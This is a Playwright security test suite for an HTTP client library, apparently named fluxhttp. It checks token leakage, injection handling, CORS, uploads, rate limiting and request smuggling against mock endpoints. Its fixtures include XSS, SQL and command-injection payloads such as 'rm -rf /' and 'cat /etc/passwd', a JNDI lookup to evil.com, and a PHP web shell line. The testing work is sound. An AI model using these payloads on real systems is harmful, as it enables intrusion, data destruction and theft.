import { test, expect, testData } from '../utils/fixtures';

test.describe('Security Testing Scenarios', () => {
  test.describe('HTTPS and TLS', () => {
    test('should enforce HTTPS in production-like environments', async ({ 
      fluxHttpHelpers 
    }) => {
      // Test HTTPS enforcement
      const result = await fluxHttpHelpers.page.evaluate(async () => {
        // Create instance that prefers HTTPS
        const httpsInstance = window.fluxhttp.create({
          baseURL: 'https://localhost:3000', // Note: This would fail in test env
          timeout: 5000
        });
        
        try {
          const response = await httpsInstance.get('/health');
          return { success: true, protocol: 'https' };
        } catch (error) {
          // Expected to fail in test environment
          return { 
            success: false, 
            error: error.message,
            isConnectionError: error.message.includes('Failed to fetch') || 
                              error.message.includes('SSL') ||
                              error.message.includes('certificate')
          };
        }
      });
      
      // In test environment, HTTPS will fail (expected)
      // In production, this should be properly configured
      expect(result.success || result.isConnectionError).toBe(true);
    });

    test('should handle SSL/TLS certificate validation', async ({ 
      fluxHttpHelpers 
    }) => {
      // Test with self-signed or invalid certificates
      const result = await fluxHttpHelpers.page.evaluate(async () => {
        // Attempt connection to endpoint with certificate issues
        try {
          const response = await window.fluxHttpInstance.get('https://self-signed.badssl.com/');
          return { success: true, unexpected: true };
        } catch (error) {
          return {
            success: false,
            error: error.message,
            isCertificateError: error.message.includes('certificate') ||
                               error.message.includes('SSL') ||
                               error.message.includes('NET::ERR_CERT')
          };
        }
      });
      
      // Should fail due to certificate issues
      expect(result.success).toBe(false);
      // Error should be related to certificate validation
      expect(result.isCertificateError || result.error.includes('Failed to fetch')).toBe(true);
    });
  });

  test.describe('Authentication Security', () => {
    test('should not expose authentication tokens in logs or errors', async ({ 
      fluxHttpHelpers,
      authHelper
    }) => {
      // Login to get a token
      const token = await authHelper.login();
      
      // Make a request that will fail and check error doesn't expose token
      const result = await fluxHttpHelpers.page.evaluate(async (token) => {
        try {
          await window.fluxHttpInstance.get('/error/401', {
            headers: { Authorization: `Bearer ${token}` }
          });
          return { success: true };
        } catch (error) {
          return {
            success: false,
            errorMessage: error.message,
            errorString: error.toString(),
            containsToken: error.message.includes(token) || 
                          error.toString().includes(token)
          };
        }
      }, token);
      
      expect(result.success).toBe(false);
      expect(result.containsToken).toBe(false); // Token should not be in error messages
    });

    test('should handle token injection attempts', async ({ 
      fluxHttpHelpers 
    }) => {
      // Attempt to inject malicious tokens
      const maliciousTokens = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/exploit}'
      ];
      
      const results = [];
      
      for (const maliciousToken of maliciousTokens) {
        const result = await fluxHttpHelpers.page.evaluate(async (token) => {
          try {
            const response = await window.fluxHttpInstance.get('/auth/profile', {
              headers: { Authorization: `Bearer ${token}` }
            });
            return { 
              success: true, 
              token,
              unexpected: true // Should not succeed with malicious token
            };
          } catch (error) {
            return {
              success: false,
              token,
              status: error.response?.status,
              isUnauthorized: error.response?.status === 401
            };
          }
        }, maliciousToken);
        
        results.push(result);
      }
      
      // All malicious tokens should be rejected
      expect(results.every(r => !r.success)).toBe(true);
      expect(results.every(r => r.isUnauthorized)).toBe(true);
    });

    test('should validate token format and structure', async ({ 
      fluxHttpHelpers 
    }) => {
      const invalidTokens = [
        '',                          // Empty token
        'invalid',                   // Simple string
        'Bearer token',              // Malformed Bearer
        'a'.repeat(10000),          // Extremely long token
        null,                       // Null token
        undefined                   // Undefined token
      ];
      
      const results = [];
      
      for (const invalidToken of invalidTokens) {
        const result = await fluxHttpHelpers.page.evaluate(async (token) => {
          try {
            const headers = {};
            if (token !== null && token !== undefined) {
              headers['Authorization'] = `Bearer ${token}`;
            }
            
            const response = await window.fluxHttpInstance.get('/auth/profile', { headers });
            return { success: true, token, unexpected: true };
          } catch (error) {
            return {
              success: false,
              token,
              status: error.response?.status,
              error: error.message
            };
          }
        }, invalidToken);
        
        results.push(result);
      }
      
      // All invalid tokens should be rejected
      expect(results.every(r => !r.success)).toBe(true);
    });
  });

  test.describe('Input Validation and Sanitization', () => {
    test('should handle XSS attempts in request data', async ({ 
      fluxHttpHelpers 
    }) => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("xss")',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>'
      ];
      
      const results = [];
      
      for (const payload of xssPayloads) {
        const result = await fluxHttpHelpers.page.evaluate(async (payload) => {
          try {
            const response = await window.fluxHttpInstance.post('/echo', {
              message: payload,
              data: payload
            });
            
            return {
              success: true,
              payload,
              responseData: response.data,
              containsScript: JSON.stringify(response.data).includes('<script')
            };
          } catch (error) {
            return {
              success: false,
              payload,
              error: error.message
            };
          }
        }, payload);
        
        results.push(result);
      }
      
      // Server should echo back the data (testing client doesn't execute it)
      const successfulResults = results.filter(r => r.success);
      expect(successfulResults.length).toBeGreaterThan(0);
      
      // Verify XSS payloads are not executed in the client
      // They should be treated as plain text
      successfulResults.forEach(result => {
        expect(result.responseData.body.message).toBe(result.payload);
      });
    });

    test('should handle SQL injection attempts', async ({ 
      fluxHttpHelpers 
    }) => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; SELECT * FROM admin; --",
        "' UNION SELECT password FROM users --",
        "1'; EXEC xp_cmdshell('ping google.com'); --"
      ];
      
      const results = [];
      
      for (const payload of sqlInjectionPayloads) {
        const result = await fluxHttpHelpers.page.evaluate(async (payload) => {
          try {
            const response = await window.fluxHttpInstance.post('/echo', {
              userId: payload,
              query: payload
            });
            
            return {
              success: true,
              payload,
              responseData: response.data
            };
          } catch (error) {
            return {
              success: false,
              payload,
              error: error.message,
              status: error.response?.status
            };
          }
        }, payload);
        
        results.push(result);
      }
      
      // Requests should either succeed (payload treated as data) or fail gracefully
      results.forEach(result => {
        if (result.success) {
          // Data should be echoed back as-is (not executed)
          expect(result.responseData.body.userId || result.responseData.body.query).toBe(result.payload);
        } else {
          // If failed, should be a proper HTTP error, not a database error
          expect(result.status).toBeGreaterThan(0);
        }
      });
    });

    test('should handle command injection attempts', async ({ 
      fluxHttpHelpers 
    }) => {
      const commandInjectionPayloads = [
        '; ls -la',
        '&& ping google.com',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
        '; rm -rf /',
        '&& net user admin admin /add'
      ];
      
      const results = [];
      
      for (const payload of commandInjectionPayloads) {
        const result = await fluxHttpHelpers.page.evaluate(async (payload) => {
          try {
            const response = await window.fluxHttpInstance.post('/echo', {
              command: payload,
              filename: payload
            });
            
            return {
              success: true,
              payload,
              responseData: response.data
            };
          } catch (error) {
            return {
              success: false,
              payload,
              error: error.message
            };
          }
        }, payload);
        
        results.push(result);
      }
      
      // All payloads should be treated as data, not executed
      results.forEach(result => {
        if (result.success) {
          const responseBody = result.responseData.body;
          expect(responseBody.command || responseBody.filename).toBe(result.payload);
        }
      });
    });
  });

  test.describe('Header Security', () => {
    test('should handle malicious headers gracefully', async ({ 
      fluxHttpHelpers 
    }) => {
      const maliciousHeaders = [
        { 'X-Forwarded-For': '127.0.0.1; rm -rf /' },
        { 'User-Agent': '<script>alert(1)</script>' },
        { 'X-Real-IP': '../../../etc/passwd' },
        { 'X-Custom': '\r\nSet-Cookie: admin=true' },
        { 'Referer': 'javascript:alert(1)' }
      ];
      
      const results = [];
      
      for (const headers of maliciousHeaders) {
        const result = await fluxHttpHelpers.page.evaluate(async (headers) => {
          try {
            const response = await window.fluxHttpInstance.get('/echo', { headers });
            
            return {
              success: true,
              headers,
              requestHeaders: response.data.headers
            };
          } catch (error) {
            return {
              success: false,
              headers,
              error: error.message
            };
          }
        }, headers);
        
        results.push(result);
      }
      
      // Requests should succeed but headers should be properly handled
      const successfulResults = results.filter(r => r.success);
      expect(successfulResults.length).toBeGreaterThan(0);
      
      // Verify headers are passed through but not executed
      successfulResults.forEach(result => {
        expect(result.requestHeaders).toBeDefined();
      });
    });

    test('should prevent header injection attacks', async ({ 
      fluxHttpHelpers 
    }) => {
      // Attempt CRLF injection in headers
      const crlfPayloads = [
        'test\r\nX-Injected: true',
        'test\nSet-Cookie: admin=true',
        'test\r\n\r\n<script>alert(1)</script>',
        'test\u000d\u000aX-Evil: injected'
      ];
      
      const results = [];
      
      for (const payload of crlfPayloads) {
        const result = await fluxHttpHelpers.page.evaluate(async (payload) => {
          try {
            const response = await window.fluxHttpInstance.get('/echo', {
              headers: {
                'X-Test-Header': payload
              }
            });
            
            return {
              success: true,
              payload,
              requestHeaders: response.data.headers
            };
          } catch (error) {
            return {
              success: false,
              payload,
              error: error.message,
              isHeaderError: error.message.includes('header') || 
                            error.message.includes('invalid')
            };
          }
        }, payload);
        
        results.push(result);
      }
      
      // Check that CRLF injection doesn't create multiple headers
      results.forEach(result => {
        if (result.success) {
          const headerValue = result.requestHeaders['x-test-header'];
          // Header should contain the payload but not be split into multiple headers
          expect(typeof headerValue).toBe('string');
        }
      });
    });

    test('should handle security headers properly', async ({ 
      fluxHttpHelpers 
    }) => {
      // Test security-sensitive headers
      const securityHeaders = {
        'Content-Security-Policy': "default-src 'self'",
        'X-Frame-Options': 'DENY',
        'X-Content-Type-Options': 'nosniff',
        'Strict-Transport-Security': 'max-age=31536000',
        'X-XSS-Protection': '1; mode=block'
      };
      
      const result = await fluxHttpHelpers.page.evaluate(async (headers) => {
        try {
          const response = await window.fluxHttpInstance.get('/echo', { headers });
          
          return {
            success: true,
            requestHeaders: response.data.headers,
            responseHeaders: response.headers
          };
        } catch (error) {
          return {
            success: false,
            error: error.message
          };
        }
      }, securityHeaders);
      
      expect(result.success).toBe(true);
      
      // Verify security headers are properly transmitted
      Object.keys(securityHeaders).forEach(headerName => {
        const normalizedName = headerName.toLowerCase();
        expect(result.requestHeaders[normalizedName]).toBeDefined();
      });
    });
  });

  test.describe('CORS Security', () => {
    test('should handle CORS preflight requests', async ({ 
      fluxHttpHelpers 
    }) => {
      const result = await fluxHttpHelpers.page.evaluate(async () => {
        try {
          // Make a request that would trigger CORS preflight
          const response = await window.fluxHttpInstance.post('/cors-test', 
            { data: 'test' },
            {
              headers: {
                'X-Custom-Header': 'test-value',
                'Content-Type': 'application/json'
              }
            }
          );
          
          return {
            success: true,
            status: response.status,
            data: response.data
          };
        } catch (error) {
          return {
            success: false,
            error: error.message,
            isCorsError: error.message.includes('CORS') ||
                        error.message.includes('cross-origin')
          };
        }
      });
      
      // In test environment with proper CORS setup, this should succeed
      expect(result.success).toBe(true);
    });

    test('should handle cross-origin requests securely', async ({ 
      fluxHttpHelpers 
    }) => {
      // Test requests to different origins
      const origins = [
        'http://localhost:3001', // Mock API server
        'http://127.0.0.1:3000'  // Different host format
      ];
      
      const results = [];
      
      for (const origin of origins) {
        const result = await fluxHttpHelpers.page.evaluate(async (origin) => {
          try {
            // Create instance pointing to different origin
            const crossOriginInstance = window.fluxhttp.create({
              baseURL: origin,
              timeout: 5000
            });
            
            const response = await crossOriginInstance.get('/health');
            
            return {
              success: true,
              origin,
              status: response.status
            };
          } catch (error) {
            return {
              success: false,
              origin,
              error: error.message,
              isCorsError: error.message.includes('CORS') ||
                          error.message.includes('cross-origin') ||
                          error.message.includes('Failed to fetch')
            };
          }
        }, origin);
        
        results.push(result);
      }
      
      // At least the mock API server should be accessible
      const mockApiResult = results.find(r => r.origin.includes('3001'));
      expect(mockApiResult?.success).toBe(true);
    });
  });

  test.describe('Data Exposure Prevention', () => {
    test('should not expose sensitive data in network errors', async ({ 
      fluxHttpHelpers 
    }) => {
      const sensitiveData = {
        password: 'supersecret123',
        apiKey: 'sk-1234567890abcdef',
        token: 'Bearer xyz789',
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111'
      };
      
      const result = await fluxHttpHelpers.page.evaluate(async (data) => {
        try {
          // Make request that will fail
          await window.fluxHttpInstance.post('/error/500', data);
          return { success: true, unexpected: true };
        } catch (error) {
          const errorStr = error.toString();
          const messageStr = error.message;
          
          return {
            success: false,
            containsSensitiveData: Object.values(data).some(value => 
              errorStr.includes(value) || messageStr.includes(value)
            ),
            errorMessage: error.message
          };
        }
      }, sensitiveData);
      
      expect(result.success).toBe(false);
      expect(result.containsSensitiveData).toBe(false);
    });

    test('should handle file upload security', async ({ 
      fluxHttpHelpers 
    }) => {
      // Test malicious file types
      const maliciousFiles = [
        { name: 'test.exe', content: 'MZ\x90\x00', type: 'application/exe' },
        { name: 'script.js', content: 'alert("xss")', type: 'application/javascript' },
        { name: '../../../etc/passwd', content: 'root:x:0:0', type: 'text/plain' },
        { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/php' }
      ];
      
      const results = [];
      
      for (const file of maliciousFiles) {
        const result = await fluxHttpHelpers.page.evaluate(async (file) => {
          const formData = new FormData();
          const blob = new Blob([file.content], { type: file.type });
          formData.append('file', blob, file.name);
          
          try {
            const response = await window.fluxHttpInstance.post('/files/upload', formData);
            
            return {
              success: true,
              filename: file.name,
              uploadedName: response.data.filename,
              sanitized: response.data.filename !== file.name
            };
          } catch (error) {
            return {
              success: false,
              filename: file.name,
              error: error.message,
              status: error.response?.status
            };
          }
        }, file);
        
        results.push(result);
      }
      
      // Check file upload handling
      results.forEach(result => {
        if (result.success) {
          // Filename should be sanitized if it's dangerous
          if (result.filename.includes('../') || result.filename.includes('\\')) {
            expect(result.sanitized).toBe(true);
          }
        } else {
          // Should fail with appropriate error for dangerous files
          expect(result.status).toBeGreaterThan(0);
        }
      });
    });
  });

  test.describe('Rate Limiting and DoS Protection', () => {
    test('should enforce rate limits', async ({ 
      fluxHttpHelpers 
    }) => {
      // Test rate limiting
      const rapidRequests = Array.from({ length: 20 }, (_, i) =>
        fluxHttpHelpers.executeRequest('get', '/limited')
      );
      
      const results = await Promise.allSettled(rapidRequests);
      
      const successful = results.filter(r => r.status === 'fulfilled' && r.value.success);
      const rateLimited = results.filter(r => 
        r.status === 'fulfilled' && 
        !r.value.success && 
        r.value.error.status === 429
      );
      
      // Some requests should be rate limited
      expect(rateLimited.length).toBeGreaterThan(0);
      expect(successful.length).toBeLessThan(20);
    });

    test('should handle request flooding gracefully', async ({ 
      fluxHttpHelpers 
    }) => {
      // Attempt to flood with many concurrent requests
      const floodCount = 100;
      
      const result = await fluxHttpHelpers.page.evaluate(async (count) => {
        const startTime = Date.now();
        
        const requests = Array.from({ length: count }, (_, i) =>
          window.fluxHttpInstance.get(`/health?flood=${i}`).catch(error => ({
            error: true,
            status: error.response?.status,
            message: error.message
          }))
        );
        
        try {
          const responses = await Promise.all(requests);
          const endTime = Date.now();
          
          const successful = responses.filter(r => !r.error);
          const failed = responses.filter(r => r.error);
          const rateLimited = failed.filter(r => r.status === 429);
          
          return {
            success: true,
            totalRequests: count,
            successful: successful.length,
            failed: failed.length,
            rateLimited: rateLimited.length,
            duration: endTime - startTime
          };
        } catch (error) {
          return {
            success: false,
            error: error.message
          };
        }
      }, floodCount);
      
      expect(result.success).toBe(true);
      
      // Not all requests should succeed (rate limiting should kick in)
      expect(result.successful).toBeLessThan(result.totalRequests);
      
      // Some should be specifically rate limited
      expect(result.rateLimited).toBeGreaterThan(0);
    });
  });

  test.describe('Request Smuggling Prevention', () => {
    test('should handle malformed request attempts', async ({ 
      fluxHttpHelpers 
    }) => {
      // Test various malformed request patterns
      const malformedRequests = [
        { method: 'GET', url: '/echo HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin' },
        { method: 'POST', url: '/echo', data: 'normal=data\r\n\r\nGET /admin HTTP/1.1' },
        { method: 'GET', url: '/echo\r\nContent-Length: 10\r\n\r\nhidden' }
      ];
      
      const results = [];
      
      for (const request of malformedRequests) {
        const result = await fluxHttpHelpers.page.evaluate(async (req) => {
          try {
            const response = await window.fluxHttpInstance.request({
              method: req.method,
              url: req.url,
              data: req.data
            });
            
            return {
              success: true,
              request: req,
              status: response.status
            };
          } catch (error) {
            return {
              success: false,
              request: req,
              error: error.message,
              isMalformedError: error.message.includes('invalid') ||
                               error.message.includes('malformed') ||
                               error.message.includes('400')
            };
          }
        }, request);
        
        results.push(result);
      }
      
      // Malformed requests should be handled gracefully
      results.forEach(result => {
        if (!result.success) {
          // Should fail with appropriate error, not crash
          expect(result.error).toBeDefined();
        } else {
          // If successful, should return normal response
          expect(result.status).toBe(200);
        }
      });
    });
  });

  test.describe('Environment Security', () => {
    test('should not expose internal configuration', async ({ 
      fluxHttpHelpers 
    }) => {
      const result = await fluxHttpHelpers.page.evaluate(() => {
        // Check if sensitive information is exposed in global scope
        const exposedData = {
          hasFluxHttpConfig: !!window.fluxHttpConfig,
          hasFluxHttpSecrets: !!window.fluxHttpSecrets,
          hasApiKeys: !!window.apiKeys,
          hasTokens: !!window.tokens,
          globalKeys: Object.keys(window).filter(key => 
            key.toLowerCase().includes('secret') ||
            key.toLowerCase().includes('key') ||
            key.toLowerCase().includes('token') ||
            key.toLowerCase().includes('password')
          )
        };
        
        return exposedData;
      });
      
      // Should not expose sensitive configuration
      expect(result.hasFluxHttpSecrets).toBe(false);
      expect(result.hasApiKeys).toBe(false);
      expect(result.hasTokens).toBe(false);
      expect(result.globalKeys.length).toBe(0);
    });

    test('should handle debug information securely', async ({ 
      fluxHttpHelpers 
    }) => {
      const result = await fluxHttpHelpers.page.evaluate(async () => {
        // Make request and check for debug information leakage
        try {
          await window.fluxHttpInstance.get('/error/500');
          return { success: true };
        } catch (error) {
          return {
            success: false,
            hasStackTrace: error.stack !== undefined,
            hasDebugInfo: error.message.includes('internal') ||
                         error.message.includes('debug') ||
                         error.message.includes('development'),
            errorMessage: error.message
          };
        }
      });
      
      expect(result.success).toBe(false);
      
      // Error should not expose internal details in production-like environment
      // Stack traces and debug info should be minimal
      if (result.hasDebugInfo) {
        // If debug info is present, ensure it's not exposing sensitive paths
        expect(result.errorMessage).not.toMatch(/\/home\/.*\/.*\.js/);
        expect(result.errorMessage).not.toMatch(/C:\\.*\\.*\.js/);
      }
    });
  });
});